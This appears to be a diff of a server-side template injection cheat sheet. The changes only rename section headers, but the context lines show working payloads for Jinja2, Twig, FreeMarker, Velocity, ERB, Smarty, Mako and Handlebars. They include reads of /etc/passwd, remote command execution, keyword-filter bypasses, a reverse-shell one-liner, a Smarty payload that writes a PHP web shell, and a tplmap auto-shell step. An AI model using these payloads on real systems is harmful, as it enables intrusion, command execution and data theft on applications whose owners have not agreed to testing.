@@ -6,7 +6,7 @@
 
 ---
 
-## SSTI - Detect (Universal)
+## detect ssti universal
 Try math operator first to confirm rendering.
 
 ```bash
@@ -17,7 +17,7 @@ echo "{{7*7}}"
 
 ---
 
-## SSTI - Detect (ERB / Tornado)
+## detect ssti erb tornado
 Different syntax for fall-through detection.
 
 ```bash
@@ -28,7 +28,7 @@ echo "<%= 7*7 %>"
 
 ---
 
-## SSTI - Detect (Smarty / Mako)
+## detect ssti smarty mako
 Detection for `${}` style templates.
 
 ```bash
@@ -39,7 +39,7 @@ echo "\${7*7}"
 
 ---
 
-## SSTI - Identify Engine
+## fingerprint ssti engine
 Engine fingerprinting via behavior delta.
 
 ```bash
@@ -50,7 +50,7 @@ echo "{{7*'7'}}"
 
 ---
 
-## Jinja2 - Read File
+## ssti jinja2 read file
 Read /etc/passwd via Jinja2 globals.
 
 ```bash
@@ -61,7 +61,7 @@ echo "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"
 
 ---
 
-## Jinja2 - RCE via os.popen
+## ssti jinja2 rce os popen
 Universal popen via subclasses walk.
 
 ```bash
@@ -72,7 +72,7 @@ echo "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1
 
 ---
 
-## Jinja2 - RCE config Trick (Flask)
+## ssti jinja2 rce config flask
 Common Flask Jinja2 path via config object.
 
 ```bash
@@ -83,7 +83,7 @@ echo "{{ config.__class__.__init__.__globals__['os'].popen('{{CMD:str:id}}').rea
 
 ---
 
-## Jinja2 - RCE via cycler
+## ssti jinja2 rce cycler
 Newer cycler-based gadget.
 
 ```bash
@@ -94,7 +94,7 @@ echo "{{ cycler.__init__.__globals__.os.popen('{{CMD:str:id}}').read() }}"
 
 ---
 
-## Jinja2 - RCE via lipsum
+## ssti jinja2 rce lipsum
 lipsum gives access to globals.
 
 ```bash
@@ -105,7 +105,7 @@ echo "{{ lipsum.__globals__['os'].popen('{{CMD:str:id}}').read() }}"
 
 ---
 
-## Jinja2 - Filter Bypass (request)
+## bypass ssti jinja2 filter request
 Bypass filtered keywords using request object access.
 
 ```bash
@@ -116,7 +116,7 @@ echo "{{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\
 
 ---
 
-## Jinja2 - Reverse Shell One-Liner
+## ssti jinja2 reverse shell
 Drop reverse shell via warning subclass walk.
 
 ```bash
@@ -127,7 +127,7 @@ echo "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.
 
 ---
 
-## Twig - RCE via _self
+## ssti twig rce self env
 Twig <2 _self.env trick.
 
 ```bash
@@ -138,7 +138,7 @@ echo "{{ _self.env.registerUndefinedFilterCallback('shell_run') }}{{ _self.env.g
 
 ---
 
-## Twig - RCE via filter
+## ssti twig rce filter
 Modern Twig RCE.
 
 ```bash
@@ -149,7 +149,7 @@ echo "{{ ['{{CMD:str:id}}']|filter('system') }}"
 
 ---
 
-## FreeMarker - RCE Run
+## ssti freemarker rce java
 Java FreeMarker template RCE.
 
 ```bash
@@ -160,7 +160,7 @@ echo "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"{{CMD:st
 
 ---
 
-## Velocity - RCE Runtime
+## ssti velocity rce java
 Velocity template RCE on Java apps.
 
 ```bash
@@ -171,7 +171,7 @@ echo "#set(\$x='') #set(\$rt=\$x.class.forName('java.lang.Runtime')) \$rt.getRun
 
 ---
 
-## ERB (Ruby) - RCE
+## ssti erb rce ruby
 Embedded Ruby template injection.
 
 ```bash
@@ -182,7 +182,7 @@ echo "<%= system('{{CMD:str:id}}') %>"
 
 ---
 
-## Smarty - RCE
+## ssti smarty rce php tag
 Smarty self-shell gadget.
 
 ```bash
@@ -193,7 +193,7 @@ echo "{php}system('{{CMD:str:id}}');{/php}"
 
 ---
 
-## Smarty - RCE via Math
+## ssti smarty rce writefile
 Newer Smarty bypass.
 
 ```bash
@@ -204,7 +204,7 @@ echo "{Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,\"<?php system(\$_GET
 
 ---
 
-## Mako - RCE
+## ssti mako rce python
 Python Mako template injection.
 
 ```bash
@@ -215,7 +215,7 @@ echo "<%import os%>\${os.popen('{{CMD:str:id}}').read()}"
 
 ---
 
-## Handlebars - RCE
+## ssti handlebars rce node
 Node.js handlebars compromise via require.
 
 ```bash
@@ -226,7 +226,7 @@ echo "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{t
 
 ---
 
-## SSTI - Tplmap Auto-Run
+## ssti tplmap auto shell
 Use tplmap to detect + run shell.
 
 ```bash
